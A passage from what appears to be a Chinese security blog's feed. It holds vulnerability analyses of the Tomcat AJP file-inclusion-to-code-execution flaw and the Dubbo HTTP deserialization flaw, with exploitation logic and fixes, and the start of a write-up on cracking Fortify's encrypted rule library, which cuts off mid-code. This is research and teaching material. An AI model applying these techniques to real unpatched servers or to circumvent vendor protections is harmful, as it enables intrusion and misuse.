class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>fork<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>xpoweredBy<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>3<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">&lt;!-- The mappings for the JSP servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jspx<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于<code>javax.servlet.include.servlet_path</code>值为<code>/</code>不为<code>null</code>,所以根据代码逻辑我们jsp文件的路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jspUri = javax.servlet.include.servlet_path + javax.servlet.include.path_info</span><br><span class="line">jspUri = / + code.txt</span><br><span class="line">jspUri = /code.txt</span><br></pre></td></tr></table></figure><p>可见<code>jspUri</code>是客户端可控。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/7EE0D33F-5FEA-4F9F-A944-9F3FA1CE1C4D.png" alt="jspUri的构造"></p><p>由我们控制的<code>jspuri</code>被封装成了一个<code>JspServletWrapper</code>添加到了Jsp运行上下文<code>JspRuntimeContext</code>中.最后<code>wrapper.service()</code>会编译<code>code.txt</code>,并执行它的<code>_jspService()</code>方法来处理当前请求，我们的代码被执行。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/4D7B7BDF-CAFB-43F7-BF81-D4AB3EE44DFF.png" alt="code.txt被tomcat编译执行"></p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/23BFC3AE-EC40-4DF3-AD0E-913A913B3F9E.png" alt="code.txt被tomcat编译执行"></p><p>综上整个过程就清晰了，简而言之就是我们发送AJP请求，请求的是<code>/docs/test.jsp</code>这个jsp,但是由于那三个include属性可控,我们可以将<code>test.jsp</code>对应的服务器脚本文件改为了<code>code.txt</code>。<br>导致tomcat把我们的<code>code.txt</code>当jsp文件编译运行，导致代码执行。</p><p>最后给大家提两个问题：</p><p><strong>问题1: 请求的/docs/test.jsp需要在web目录下真是存在么？</strong></p><p>答： 不需要，我们只是为了让请求路径命中<code>org.apache.catalina.servlets.DefaultServlet</code>这个servlet的匹配规则。</p><p><strong>问题2: 如果tomcat不解析任何jsp,jspx等后缀，或者以它们为view的模板，还能触发漏洞么？如果可以又该如何触发？</strong></p><p>PS：这个问题是一个师傅留给我的，觉得很有意思，分享给大家思考，有想法的可以留言讨论。</p><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p>Tomcat在8.5.51版本做了如下修复 ：</p><ol><li>默认不开启AJP</li><li>默认只监听本地ip</li><li>强制设置认证secret</li><li>代码层面主要在<code>AjpProcessor</code>类的<code>prepareRequest</code>方法封装<code>requst</code>对象时采用了白名单，只添加已知属性。这样<code>三个include属性</code>不再被客户端控制，漏洞修复。</li></ol><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/E57AE140-7077-4F97-AEBD-5011AE8D8BCE.png" alt="修复代码"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ" target="_blank" rel="noopener">【WEB安全】Tomcat-Ajp协议漏洞分析</a></li><li><a href="https://github.com/apache/tomcat/commit/b99fba5bd796d876ea536e83299603443842feba" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/b99fba5bd796d876ea536e83299603443842feba</a></li><li><a href="https://github.com/apache/tomcat/commit/40d5d93bd284033cf4a1f77f5492444f83d803e2" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/40d5d93bd284033cf4a1f77f5492444f83d803e2</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h2&gt;&lt;p&gt;Tomcat根据默认配置(&lt;code&gt;conf/server.xml&lt;/code&gt;）
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="tomcat" scheme="http://gv7.me/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-17564:Apache dubbo HTTP协议反序列化漏洞分析</title>
    <link href="http://gv7.me/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/"/>
    <id>http://gv7.me/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/</id>
    <published>2020-02-14T15:24:22.000Z</published>
    <updated>2020-02-22T08:41:02.441Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Apache dubbo是一个是基于Java的高性能开源RPC框架。它支持dubbo，http,rmi,hessian等协议。本次问题出现在dubbo开启http协议后，会将消费者提交的<code>request</code>请求，在无安全校验的情况下直接交给了<code>spring-web.jar</code>进行处理，最终<code>request.getInputStream()</code>被反序列化,故存在反序列化漏洞。下面我们来调试分析代码。</p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><ul><li>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</li><li>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</li><li>Apache Dubbo = 2.5.x </li></ul><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><ul><li>OS: Mac OSX</li><li>JDK: 1.8.0_191</li><li>Dubbo: 2.7.3</li></ul><p>环境搭建这里我选择官方的<code>samples</code>中的<code>dubbo-samples-http</code></p><p><a href="https://github.com/apache/dubbo-samples/" target="_blank" rel="noopener">https://github.com/apache/dubbo-samples/</a></p><p>源码下载后将<code>pom.xml</code>中指定的dubbo版本修改为<code>2.7.3</code>,同时加入<code>commons-collections4-4.0.jar</code>方便测试。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source.level</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">target.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target.level</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 修改dubbo版本为2.7.3 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo.version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">dubbo.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>4.3.16.RELEASE<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">junit.version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">junit.version</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">&lt;!-- 添加一个可用的Gadget到classpath --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时dubbo依赖zookeeper,请自行安装！</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>dubbo启用http协议后，所有的请求都会通过<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler</code>类的<code>handle</code>方法进行处理。我们在这打断点，并发送poc开始跟踪分析。</p><p>首先<code>handle</code>方法会获取请求路径，然后通过这个路径去<code>skeletonMap</code>里获取到该接口对应的处理对象，来处理当前<code>request</code>请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取请求的路径(/org.apache.dubbo.samples.http.api.DemoService)</span></span><br><span class="line">    String uri = request.getRequestURI();</span><br><span class="line">    <span class="comment">// 2. 通过请求的接口路径获取对应的处理对象</span></span><br><span class="line">    HttpInvokerServiceExporter skeleton = (HttpInvokerServiceExporter)HttpProtocol.<span class="keyword">this</span>.skeletonMap.get(uri);</span><br><span class="line">    <span class="keyword">if</span> (!request.getMethod().equalsIgnoreCase(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        response.setStatus(<span class="number">500</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        RpcContext.getContext().setRemoteAddress(request.getRemoteAddr(), request.getRemotePort());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 使用获取到的处理对象进行处理请求</span></span><br><span class="line">            skeleton.handleRequest(request, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步中存储接口地址和处理对象的<code>skeletonMap</code></p><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/skeletonMap.png" alt="skeletonMap存储内容"></p><p>处理对象是<code>HttpInvokerServiceExporter</code>类对象，它负责获取远程调用对象，并执行获取结果返回给客户端。跟进它的<code>handleRequest</code>方法，<code>request</code>对象被传入<code>readRemoteInvocation</code>方法中来获取<code>RemoteInvocation</code>远程调用对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 从request对象获取远程调用对象</span></span><br><span class="line">        RemoteInvocation invocation = <span class="keyword">this</span>.readRemoteInvocation(request);</span><br><span class="line">        RemoteInvocationResult result = <span class="keyword">this</span>.invokeAndCreateResult(invocation, <span class="keyword">this</span>.getProxy());</span><br><span class="line">        <span class="keyword">this</span>.writeRemoteInvocationResult(request, response, result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NestedServletException(<span class="string">"Class not found during deserialization"</span>, var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readRemoteInvocation</code>方法将<code>request.getInputStream()</code>(我们提交的序列化内容)传入<code>createObjectInputStream</code>方法，封装为一个<code>ObjectInputStream</code>。该对象又被传入<code>doReadRemoteInvocation</code>方法中，进行最终的获取操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">readRemoteInvocation</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 传入request对象和request.getInputStream()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.readRemoteInvocation(request, request.getInputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 2. 将request.getInputStream()封装为ObjectInputStream</span></span><br><span class="line">    ObjectInputStream ois = <span class="keyword">this</span>.createObjectInputStream(<span class="keyword">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">    RemoteInvocation var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 3. 获取RemoteInvocation远程调用对象</span></span><br><span class="line">        var4 = <span class="keyword">this</span>.doReadRemoteInvocation(ois);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>doReadRemoteInvocation</code>方法中，<code>ObjectInputStream</code>类对象<code>ois</code>直接被反序列化了。这个过程中没有进行任何过滤，导致我们传入的恶意序列化对象可以被反序列化创建，漏洞触发！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.rmi.org.springframework.remoting.rmi.RemoteInvocationSerializingExporter</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 恶意对象在此被反序列化，漏洞触发</span></span><br><span class="line">    Object obj = ois.readObject();</span><br><span class="line">    <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RemoteException(<span class="string">"Deserialized object needs to be assignable to type ["</span> + RemoteInvocation.class.getName() + <span class="string">"]: "</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (RemoteInvocation)obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/exploit-demo.png" alt="利用演示"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>漏洞出现的原因<code>dubbo</code>HTTP接口将携带有恶意反序列化数据的<code>request</code>，在无安全校验的情况下直接交给了<code>spring-web.jar</code>的<code>HttpInvokerServiceExporter</code>进行处理，导致存在反序列化漏洞。按理说这个漏洞不仅仅只是<code>dubbo</code>自身的问题，还是<code>spring</code>的问题。</p><p>在2.7.4.1版本开始，dubbo处理HTTP接口的调用请求交给了<code>jsonrpc4j.jar</code>的<code>JsonRpcServer</code>去处理了。</p><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/fix.png" alt="修复方式"></p><p>跟踪分析<code>JsonRpcServer</code>类的<code>handle</code>方法后，<code>request.getInputStream()</code>没有再被反序列化了。所以原来的利用方法失效了。</p><h2 id="0x06-漏洞总结"><a href="#0x06-漏洞总结" class="headerlink" title="0x06 漏洞总结"></a>0x06 漏洞总结</h2><p>该漏洞利用虽然简单粗暴，但在黑盒情况下利用难点有两个，一是我们无法得知web服务是否是dubbo http接口。二是如何获取接口路径，该路径可以在服务器上的<code>zookeeper</code>和<code>http-provider</code>配置文件中找到，如果不配合其他漏洞是不容易获取的。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html" target="_blank" rel="noopener">https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html</a></li><li><a href="https://mp.weixin.qq.com/s/CMA79NyeZN2e_nSxj8L-wQ" target="_blank" rel="noopener">CVE-2019-17564：Apache Dubbo反序列化漏洞分析</a></li><li><a href="https://mp.weixin.qq.com/s/pHnhHMNArAiZPVGR1btZIg" target="_blank" rel="noopener">【安全风险通告】Apache Dubbo反序列化漏洞安全风险通告</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h2&gt;&lt;p&gt;Apache dubbo是一个是基于Java的高性能开源RPC框架。它支持dubbo
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="dubbo" scheme="http://gv7.me/tags/dubbo/"/>
    
  </entry>
  
  <entry>
    <title>fortify规则库解密之旅</title>
    <link href="http://gv7.me/articles/2019/fortify-rule-library-decryption-process/"/>
    <id>http://gv7.me/articles/2019/fortify-rule-library-decryption-process/</id>
    <published>2019-12-22T15:18:28.000Z</published>
    <updated>2019-12-23T17:27:09.428Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间在学习fortify的规则编写，想充分利用其污点回溯功能来扫描出当下比较新的漏洞，比如fastjson反序列化漏洞。网上有比较好的资料是《fortify安全代码规则编写指南》，但是很缺例子。于是想参考下官方的规则库，但是是加密的，万般无奈只能踏上解密之旅。</p><h2 id="0x01-解密思路"><a href="#0x01-解密思路" class="headerlink" title="0x01 解密思路"></a>0x01 解密思路</h2><p>猜测fortify会和AWVS一样，会将规则库加载到内存当中进行解密，然后再使用其进行代码扫描。基于这个想法，它必然存在一个解密方法，而这个方法肯定在某个jar当中。锁定负责解密的jar之后，就可以审计jar的所有方法。然后通过调试来理清解密流程，最后我们就可以写代码来模拟这个过程，来解密规则库。</p><h2 id="0x02-定位解密jar"><a href="#0x02-定位解密jar" class="headerlink" title="0x02 定位解密jar"></a>0x02 定位解密jar</h2><p>通过反编译发现fortify依赖的jar基本都没有混淆，说明我们可以通过<code>jar名</code>和<code>类名</code>来初步锁定加密方法所在jar。类名搜索工具使用的是我在<a href="http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/">《如何快速找到POC/EXP依赖的jar？》</a>一文中开发的<code>SearchClassInJar.jar</code>。在分别尝试<code>encrypt</code>,<code>decrypt</code>,<code>crypto</code>,<code>rule</code>,<code>fortify</code>等关键字后,最终搜索到两个可疑jar。</p><ol><li>fortify-common-17.10.0.0156.jar</li><li>fortify-crypto-1.0.jar</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/F42189E8-11C8-4825-A49B-58FD79640C35.png" alt="搜索解密jar"></p><h2 id="0x03-定位解密方法"><a href="#0x03-定位解密方法" class="headerlink" title="0x03 定位解密方法"></a>0x03 定位解密方法</h2><h4 id="3-1-通过调试定位"><a href="#3-1-通过调试定位" class="headerlink" title="3.1 通过调试定位"></a>3.1 通过调试定位</h4><p>定位解密方法最好的方法就是调试。打开fortify的<code>\Core\private-bin\awb\productlaunch.cmd</code>脚本，在最后一行如下图位置粘贴调试配置，就可以以调试模式启动fortify。然后配置IDEA连接5005端口即可进行调试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/ECBDE745-99FE-40AC-8C13-D1267B9CA5BB.png" alt="让fortify开启调试模式"></p><p>通过审计这两个jar代码，基本确定<code>fortify-crypto-1.0.jar</code>就是加解密方法所在。通过函数名，参数类型，代码逻辑确定了如下涉及解密的可疑方法，并给它们都打上断点。</p><ol><li>void <code>decrypt</code>(long[] v, long[] k)</li><li>void <code>dec</code>(InputStream source, OutputStream dest, long[] usrKey)</li><li>InputStream <code>decryptCompressedAfterHeaders</code>(InputStream encrypted, String keyString)</li><li>InputStream <code>decryptAfterHeaders</code>(InputStream encrypted, String keyString, boolean compressed)</li><li>InputStream <code>decryptCompressed</code>(InputStream encrypted, String keyString)</li><li>void <code>encryptAfterHeaders</code>(InputStream stream, OutputStream ciphertext, String keyString, boolean compress)</li></ol><p>接着运行fortify扫描一个<code>java web demo</code>，最终漏洞是扫描出来了，但是没有一个可疑方法被调用，甚是奇怪。于是我将所有方法都打上断点，发现扫描期间只有<code>readHeaders(InputStream encrypted)</code>被调用了。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/8128736C-CBCB-4521-9E67-E33D900E0756.png" alt="扫描期间只有readHeaders方法被调用"></p><p>难道fortify并没有在扫描时对规则进行解密，可以直接读取规则内容？后面通过调用栈上下文也没发现解密操作。</p><h4 id="3-2-通过编码调用定位"><a href="#3-2-通过编码调用定位" class="headerlink" title="3.2 通过编码调用定位"></a>3.2 通过编码调用定位</h4><p>这时一个朋友突然叫去包饺子，我才记起今天是冬至。为了速战速决，我决定 通过写代码直接将规则库传入到可疑方法中进行解密，然后看返回的解密结果是否是有意义的明文来判断是否是我们要找的解密方法。 于是将CryptoUtil类中的所有代码审计一遍之后，发现decryptCompressed()可以解密压缩一个文件，感觉看到来希望。​</p><p>下面我们来看看该方法的运行流程。该方法最终会调用decryptAfterHeaders()，它负责控制解密解压整个流程。可以看到如果key没设置会被设置为默认值。接着会调用doBlockCipher()来解密，使用uncompressString来解压。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/0B404A33-CFBB-49CF-BE75-FB2364DEA968.png" alt="解密压缩方法decryptAfterHeaders()"></p><p>我们再来看看<code>doBlockCipher()</code>方法,它可以进行加密和解密。传入的是<code>false</code>所以是解密。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/DC72BDA4-2492-405B-AC9A-3815A386311A.png" alt="doBlockCipher()方法调用dec对文件进行解密"></p><p>而最终文件内容会被传入<code>dec()</code>方法解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dec</span><span class="params">(InputStream source, OutputStream dest, <span class="keyword">long</span>[] usrKey)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">long</span>[] k = (<span class="keyword">long</span>[])((<span class="keyword">long</span>[])usrKey.clone());</span><br><span class="line">    <span class="keyword">byte</span>[] byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">byte</span>[] byteBufDelay = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">long</span>[] unsigned32Buf = <span class="keyword">new</span> <span class="keyword">long</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">long</span> top = <span class="number">4294967295L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> bytesRead;</span><br><span class="line">    <span class="keyword">while</span>((bytesRead = source.read(byteBuf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytesRead &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byteArrayToUnsigned32(byteBuf, unsigned32Buf);</span><br><span class="line">        decrypt(unsigned32Buf, k);</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">0</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">1</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">2</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">3</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        unsigned32ToByteArray(unsigned32Buf, byteBuf);</span><br><span class="line">        <span class="keyword">if</span> (source.available() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> bytesToWrite = byteBuf[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">if</span> (bytesToWrite &gt; <span class="number">8</span> || bytesToWrite &lt; <span class="number">0</span> || byteBufDelay == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, bytesToWrite);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (byteBufDelay != <span class="keyword">null</span>) &#123;</span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] t = byteBufDelay;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            